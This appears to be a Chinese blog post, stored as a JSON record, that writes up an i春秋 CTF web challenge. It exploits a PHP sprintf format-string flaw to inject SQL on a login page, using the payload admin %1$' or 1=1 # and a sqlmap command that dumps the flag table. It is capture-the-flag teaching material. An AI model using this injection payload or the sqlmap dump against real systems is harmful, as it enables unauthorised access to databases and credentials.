{"title":"i春秋-Web-SQLi","date":"2018-09-10T05:30:38.000Z","slug":"ichunqiu-web-SQLi","tags":["SQLi","Web","i春秋"],"updated":"2018-09-11T08:30:41.101Z","content":"<p>一道注入题，登录页面。</p>\n<p>试了常见的万能密码，无效，不存在弱口令。</p>\n<p>使用BP，看下过滤了哪些字符。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-SQLi/bp-1.png\" alt=\"BP-1\"></p></div>\n<p>发现参数含有<code>%</code>时，报错。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-SQLi/sqli-1.png\" alt=\"SQLi-1\"></p></div>\n<p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p>\n<p>看下<code>sprintf</code>函数的描述。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-SQLi/info-1.png\" alt=\"Info-1\"></p></div>\n<p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p>\n<p>此处不回显内容，但是有错误提示，只能盲注。</p>\n<p>可以直接用<code>sqlmap</code>跑出来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-SQLi/sqli-2.png\" alt=\"SQLi-2\"></p></div>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://www.colabug.com/4099484.html\" target=\"_blank\" rel=\"noopener\">php中利用格式化字符串漏洞绕过addslashes注入</a></p>\n","prev":{"title":"i春秋-Web-EXEC","slug":"ichunqiu-web-EXEC"},"next":{"title":"日常心路-180909","slug":"daily-life-20180909"},"link":"http://Jayl1n.github.io/post/ichunqiu-web-SQLi/","toc":[{"title":"参考链接","id":"参考链接","index":"1"}]}